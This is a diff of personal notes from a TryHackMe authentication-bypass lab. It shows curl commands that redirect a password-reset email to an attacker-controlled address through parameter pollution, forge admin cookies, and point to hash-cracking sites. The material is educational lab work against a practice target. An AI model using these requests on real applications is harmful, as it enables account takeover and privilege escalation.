@@ -63,7 +63,7 @@ This ffuf command is a little different to the previous one in Task 2. Previousl
 Logic flow is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.
 Example PHP script:
 if( url.substr(0,6) === '/admin') {
-    # Code to check user is an admin
+    ##Code to check user is an admin
 } else {
     # View Page
 }
@@ -71,12 +71,18 @@ Example for PHP:
 user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
 We use the -H flag to add an additional header to the request. In this instance, we are setting the Content-Type to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.
 In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.
-
 The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
 user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
 Create an emppty account
 user@tryhackme$ curl 'http://10.112.181.83/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={enpty_account_email}'
 
+Cookie tempering:
+user@tryhackme$ curl http://10.112.181.83/cookie-test
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.112.181.83/cookie-test
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.112.181.83/cookie-test
+
+https://crackstation.net for reverse the hash of any type
+https://www.base64encode.org
 
 
 
